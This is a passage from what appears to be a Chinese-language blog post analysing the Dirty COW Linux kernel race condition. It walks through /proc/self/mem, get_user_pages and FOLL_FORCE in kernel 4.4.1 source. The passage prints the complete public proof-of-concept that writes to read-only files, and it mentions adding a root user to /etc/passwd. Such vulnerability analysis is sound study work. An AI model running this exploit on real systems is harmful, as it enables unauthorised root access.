getchar();<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码极其简单，我们首先是通过mmap申请一个内存映射，可以看到我们将这段内存置为仅仅可读，然后我们尝试使用 <code>/proc/self/mem</code>函数向其中写入四个A字符，然后我们又尝试写入共享模块libc当中的函数页面，也就是getchar函数的地址，我们写入了一个 <code>\xcc</code>字符，而这个 <code>\xcc</code>实际上就是一个中断指令，如果我们修改成功，那么下一次调用getchar()内核将会捕获到一个中断信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Boot took <span class="hljs-number">0.28</span> seconds<br><br>/ # ./poc <br>Successfully write to the mem <span class="hljs-number">0x7efd4b963000</span><br>mymap content:AAAA<br><br>Successfully write to the mem <span class="hljs-number">0x409fb0</span><br>Trace/breakpoint trap<br><br></code></pre></td></tr></table></figure><p>上面我们会发现，映射的只读地址却被成功写入，</p><hr><p>Question?</p><blockquote><p> 十分的奇怪，这里不禁思考，如果每个进程只要权限高点的话，那不是可以随意修改自己的进程空间了吗，那很有可能遭到各种损坏的呀</p></blockquote><hr><p>因特尔手册上面有交代设置控制内核访问内存的能力的标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Write <span class="hljs-title function_">Protect</span> <span class="hljs-params">(bit <span class="hljs-number">16</span> of CR0)</span> — When <span class="hljs-built_in">set</span>, inhibits supervisor-level procedures from writing into read- only pages; when clear, allows supervisor-level procedures to write into read-only <span class="hljs-title function_">pages</span> <span class="hljs-params">(regardless of the U/S bit setting; see Section <span class="hljs-number">4.1</span><span class="hljs-number">.3</span> and Section <span class="hljs-number">4.6</span>)</span>.<br></code></pre></td></tr></table></figure><p>也就是十分重要的cr0寄存器上面的第16位 <code>WP(Write Proctect)</code> ，若设置则不允许主管级进程写入用户态的只读页面，而若清除则允许，还有一个就是SMAP，我们常遇到的内核保护标志，这里主要是禁止内核读取或写入用户空间内存，常与他一起的是SMEP</p><p>接下来我们来看一下<code>/proc/self/mem</code>的实现，其位于 <code>fs/proc/base.c</code>当中</p><p>由于本次复现用到的是 linux-4.4.1的内核，理所当然是看该版本的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">proc_mem_operations</span> =</span> &#123;                       <br>     .llseek     = mem_lseek,<br>     .read       = mem_read,<br>     .write      = mem_write,<br>     .open       = mem_open,<br>     .release    = mem_release,<br> &#125;;  <br></code></pre></td></tr></table></figure><p>而其中的read&#x2F;write指针均指向的是 <code>mem_rw</code>函数</p><p>其中比较重要的是 <code>access_remote_vm</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3649</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">3650</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br><span class="hljs-number">3651</span> &#123;<br><span class="hljs-number">3652</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-number">3653</span>     <span class="hljs-type">void</span> *old_buf = buf;<br> ...<br><span class="hljs-number">3661</span> <br><span class="hljs-number">3662</span>         ret = get_user_pages(tsk, mm, addr, <span class="hljs-number">1</span>,<br><span class="hljs-number">3663</span>                 write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br><span class="hljs-number">3664</span>         <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-number">3665</span> <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-number">3666</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3667</span> <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br></code></pre></td></tr></table></figure><p>这里发现大概在5.*版本之后 <code>get_user_pages</code>函数添加了一个wrapper <code>get_user_pages_remote</code>，但这两者区别并不是很大，这个是官方源码注释说的熬，并且据我观察 <code>get_uesr_pages_remote</code>的代码注释跟前面版本的 <code>get_user_pages</code>几乎一样～</p><p>这里不得不说一下<code>MMU</code>和<code>get_user_pages</code>的区别与相同之处，但可能并不完整:</p><p>相同：</p><ol><li>MMU与get_user_pages均是通过操作页表来将虚拟地址转换为物理地址</li></ol><p>不同：</p><ol><li>MMU是硬件实现，因此他会转而去检测一些硬件的东西，例如说我们的CR0寄存器的WP位</li><li>get_user_pages是内核的函数实现，他虽然说还是会通过页表遍历来获取物理地址，但并不会去检测cr0寄存器的取值，并且这在目前来看是有点合理的，毕竟内核没必要将用户态传入的虚拟地址再来通过MMU访问一次得到物理地址，他自身就有一个十分“安全”的解决方法</li></ol><p>然后内核再将获取到的物理地址通过 <code>kmap</code>函数映射到内核的虚拟地址空间，并且该虚拟地址空间是有着 <code>R/W</code>权限的，所以内核可以正常的读写该页面</p><p>因此 <code>/proc/slef/mem</code>就通过这种形式绕过了MMU对于地址的检测，写入了原本用户态定义为不可写的页面</p><p>very good               <img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7bec068ed1d4692eb9389b506bab.jpg"></p><h1 id="2-Exploit分析"><a href="#2-Exploit分析" class="headerlink" title="2.Exploit分析"></a>2.Exploit分析</h1><p>这里我们直接给出利用的poc,然后依次分析函数的调用情况，该poc最终导致的结果是可以再只读的文件下写入值，这无疑是十分危险的，加入我们向 <code>/etc/passwd</code>文件写入一个root权限的用户，那么就会直接导致提权</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/71cf3bc79f3df8dc41a056a48b11728b47102862.jpg"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> *map;<br><span class="hljs-type">int</span> f;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">stat</span> st;<br><span class="hljs-type">char</span> *name;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> </span>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br>    c+=<span class="hljs-built_in">madvise</span>(map,<span class="hljs-number">100</span>,MADV_DONTNEED);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;madvise %d\n\n&quot;</span>,c);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">procselfmemThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> </span>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>,O_RDWR);<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br>    <span class="hljs-built_in">lseek</span>(f,map,SEEK_SET);<br>    c+=<span class="hljs-built_in">write</span>(f,str,<span class="hljs-built_in">strlen</span>(str));<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;procselfmem %d\n\n&quot;</span>, c);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (argc&lt;<span class="hljs-number">3</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-type">pthread_t</span> pth1,pth2;<br>  f=<span class="hljs-built_in">open</span>(argv[<span class="hljs-number">1</span>],O_RDONLY);<br>  <span class="hljs-built_in">fstat</span>(f,&amp;st);<br>  name=argv[<span class="hljs-number">1</span>];<br>  map=<span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmap %x\n\n&quot;</span>,map);<br>  <span class="hljs-built_in">pthread_create</span>(&amp;pth1,<span class="hljs-literal">NULL</span>,madviseThread,argv[<span class="hljs-number">1</span>]);<br>  <span class="hljs-built_in">pthread_create</span>(&amp;pth2,<span class="hljs-literal">NULL</span>,procselfmemThread,argv[<span class="hljs-number">2</span>]);<br>  <span class="hljs-built_in">pthread_join</span>(pth1,<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-built_in">pthread_join</span>(pth2,<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们可以首先看到这里的main函数先打开了我们的 <code>victim file</code>，然后我们利用 <code>mmap</code>函数，这里是将内存中打开的文件映射到我们的用户虚拟地址空间，并且仅仅只有只读权限。</p><p>此时开启了两个线程 <code>madviseThread，procselfmemThread</code>,我们首先看第二个线程的实现</p><h2 id="第一次page-fault"><a href="#第一次page-fault" class="headerlink" title="第一次page fault"></a>第一次page fault</h2><p>这里他打开了 <code>/proc/self/mem</code>文件，也就是该用户程序的虚拟内存空间，然后不断尝试往映射到的 <code>victim file</code>区域写入我们的第二个参数的值</p><p>由于这里是写入的 <code>/proc/self/mem</code> ，因此首先调用的是 <code>mem_write</code>函数，但他实际上就是 <code>mem_rw</code>的wrapper，只是通过标识位区分他们,所以这里直接看 <code>mem_rw</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">write-&gt;mem_write-&gt;mem_rw<br>   <span class="hljs-comment">/* @file:将要写入的文件</span><br><span class="hljs-comment">    * @buf:用户希望写入的字符串</span><br><span class="hljs-comment">    * @count:写入的字节数</span><br><span class="hljs-comment">    * @ppos:即将写入的虚拟地址</span><br><span class="hljs-comment">    * @write:写标志位，这里通过mem_write函数可以看到直接传递的1值</span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-number">847</span> <span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf,                                                                                                                              </span><br><span class="hljs-params"><span class="hljs-number">848</span>             <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">int</span> write)</span> <br>849 &#123;<br><span class="hljs-number">850</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;<br><span class="hljs-number">851</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;<br><span class="hljs-number">852</span>     <span class="hljs-type">ssize_t</span> copied;<br><span class="hljs-number">853</span>     <span class="hljs-type">char</span> *page;<br>        ..............<br><span class="hljs-number">873</span> <br><span class="hljs-number">874</span>         this_len = access_remote_vm(mm, addr, page, this_len, write);<br><span class="hljs-number">875</span>         <span class="hljs-keyword">if</span> (!this_len) &#123;<br><span class="hljs-number">876</span>             <span class="hljs-keyword">if</span> (!copied)<br><span class="hljs-number">877</span>                 copied = -EIO;<br><span class="hljs-number">878</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">879</span>         &#125;<br></code></pre></td></tr></table></figure><p>其中访问用户的内存空间主要是依仗该函数 <code>access_remote_vm</code>,接着看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">access_remote_vm-&gt;__access_remote_vm<br><span class="hljs-number">3645</span> <span class="hljs-comment">/*          </span><br><span class="hljs-comment">3646  * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span><br><span class="hljs-comment">3647  * given task for page fault accounting.</span><br><span class="hljs-comment">  * @tsk:从上一级函数可以看到这里实际上传递的NULL</span><br><span class="hljs-comment">  * @mm:为file-&gt;private_data</span><br><span class="hljs-comment">  * @addr:将要写入的虚拟地址</span><br><span class="hljs-comment">  * @buf:mem_rw函数当中刚刚使用__get_free_pages获取到的新物理映射到的新内核虚拟地址</span><br><span class="hljs-comment">  * @len:即将写入的长度</span><br><span class="hljs-comment">  * @write:同上为1</span><br><span class="hljs-comment">3648  */</span>         <br><span class="hljs-number">3649</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">3650</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br><span class="hljs-number">3651</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This struct defines a memory VMM memory area. There is one of these</span><br><span class="hljs-comment">     * per VM-area/task.  A VM area is any part of the process virtual memory</span><br><span class="hljs-comment">     * space that has a special rule for the page-fault handlers (ie a shared</span><br><span class="hljs-comment">     * library, the executable area etc). </span><br><span class="hljs-comment">     * 这里的注释为结构体(strcut vm_area_struct)</span><br><span class="hljs-comment">     */</span><br><span class="hljs-number">3652</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-number">3653</span>     <span class="hljs-type">void</span> *old_buf = buf;<br><span class="hljs-number">3654</span> <br>    <span class="hljs-comment">/* lock for reading */</span><br><span class="hljs-number">3655</span>     down_read(&amp;mm-&gt;mmap_sem);<br><span class="hljs-number">3656</span>     <span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br><span class="hljs-number">3657</span>     <span class="hljs-keyword">while</span> (len) &#123;<br><span class="hljs-number">3658</span>         <span class="hljs-type">int</span> bytes, ret, offset;<br><span class="hljs-number">3659</span>         <span class="hljs-type">void</span> *maddr;<br><span class="hljs-number">3660</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">3661</span> <span class="hljs-comment">/* 通过页表来获取addr对应的物理页面，也就是page结构体，这里同样返回了映射到的内核虚拟地址 */</span><br><span class="hljs-number">3662</span>         ret = get_user_pages(tsk, mm, addr, <span class="hljs-number">1</span>,<br><span class="hljs-number">3663</span>                 write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br><span class="hljs-number">3664</span>         <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-number">3665</span> <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-number">3666</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3667</span> <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-number">3668</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">3669              * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment">3670              * we can access using slightly different code.</span><br><span class="hljs-comment">3671              */</span><br><span class="hljs-number">3672</span>             vma = find_vma(mm, addr);<br><span class="hljs-number">3673</span>             <span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br><span class="hljs-number">3674</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3675</span>             <span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br><span class="hljs-number">3676</span>                 ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br><span class="hljs-number">3677</span>                               len, write);<br><span class="hljs-number">3678</span>             <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-number">3679</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3680</span>             bytes = ret; <br><span class="hljs-number">3681</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">3682</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">3683</span>             bytes = len;<br><span class="hljs-number">3684</span>             offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-number">3685</span>             <span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br><span class="hljs-number">3686</span>                 bytes = PAGE_SIZE-offset;<br><span class="hljs-number">3687</span> <br><span class="hljs-number">3688</span>             maddr = kmap(page);<br>...<br><span class="hljs-number">3705</span> <br><span class="hljs-number">3706</span>     <span class="hljs-keyword">return</span> buf - old_buf;<br><span class="hljs-number">3707</span> &#125;<br><br></code></pre></td></tr></table></figure><p>这里主要讲解 <code>get_user_pages</code>函数，他是通过用户给出的虚拟地址从页表得到物理地址然后返回，这里传递的特殊的标识符为一个write&#x3D;1,和force&#x3D;1,这两个参数在后面体现为 <code>__get_user_pages</code>函数的参数<code>flags=FOLL_GET|FOLL_WRITE|FOLL_FORCE</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">855</span> <span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-number">856</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages, <span class="hljs-type">int</span> write,</span><br><span class="hljs-params"><span class="hljs-number">857</span>         <span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages, <span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>858 &#123;<br><span class="hljs-number">859</span>     <span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,                                                                                                              <br><span class="hljs-number">860</span>                        pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>, FOLL_TOUCH);<br><span class="hljs-number">861</span> &#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * @tsk:没变化，仍然传递的NULL</span><br><span class="hljs-comment"> * @mm:同上</span><br><span class="hljs-comment"> * @start:将要访问的用户虚拟地址</span><br><span class="hljs-comment"> * @nr_pages:指物理页框的数量，这里是传入来一个恒定的值，1</span><br><span class="hljs-comment"> * @write:1</span><br><span class="hljs-comment"> * @force:1</span><br><span class="hljs-comment"> * @pages:struct page 结构体的指针的地址</span><br><span class="hljs-comment"> * @vmas:struct vma_area_struct 结构体的指针的地址</span><br><span class="hljs-comment"> * @locked:传递NULL</span><br><span class="hljs-comment"> * @notify_drop:传递false</span><br><span class="hljs-comment"> * @flags:FOLL_TOUCH，值为0x02,官方注释为 mark page accessed</span><br><span class="hljs-comment">*/</span><br><span class="hljs-number">621</span> <span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<br><span class="hljs-number">622</span>                         <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">623</span>                         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,<br><span class="hljs-number">624</span>                         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-number">625</span>                         <span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force,<br><span class="hljs-number">626</span>                         <span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-number">627</span>                         <span class="hljs-keyword">struct</span> vm_area_struct **vmas,<br><span class="hljs-number">628</span>                         <span class="hljs-type">int</span> *locked, <span class="hljs-type">bool</span> notify_drop,<br><span class="hljs-number">629</span>                         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br><span class="hljs-number">630</span> &#123;<br><span class="hljs-number">631</span>     <span class="hljs-type">long</span> ret, pages_done;<br><span class="hljs-number">632</span>     <span class="hljs-type">bool</span> lock_dropped;<br><span class="hljs-number">633</span> <br>     .....<br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">       #define FOLL_WRITE  0x01    check pte is writable </span><br><span class="hljs-comment">#define FOLL_TOUCH  0x02    mark page accessed</span><br><span class="hljs-comment">#define FOLL_GET    0x04    do get_page on page </span><br><span class="hljs-comment">#define FOLL_FORCE  0x10    get_user_pages read/write w/o permission</span><br><span class="hljs-comment">因此执行下面的操作后，flags值应该是 FOLL_WRITE|FOLL_TOUCH|FOLL_GET|FOLL_FORCE = 0x17</span><br><span class="hljs-comment">       */</span><br><span class="hljs-number">640</span> <br><span class="hljs-number">641</span>     <span class="hljs-keyword">if</span> (pages)<br><span class="hljs-number">642</span>         flags |= FOLL_GET;<br><span class="hljs-number">643</span>     <span class="hljs-keyword">if</span> (write)<br><span class="hljs-number">644</span>         flags |= FOLL_WRITE;<br><span class="hljs-number">645</span>     <span class="hljs-keyword">if</span> (force)<br><span class="hljs-number">646</span>         flags |= FOLL_FORCE;<br><span class="hljs-number">647</span>     <br><span class="hljs-number">648</span>     pages_done = <span class="hljs-number">0</span>;<br><span class="hljs-number">649</span>     lock_dropped = <span class="hljs-literal">false</span>;<br><span class="hljs-number">650</span>     <span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-number">651</span>         ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br><span class="hljs-number">652</span>                        vmas, locked);<br><br><br></code></pre></td></tr></table></figure><p>该函数基本就是加了个锁状态防止同步，接下来我们来看 <code>__get_user_pages</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 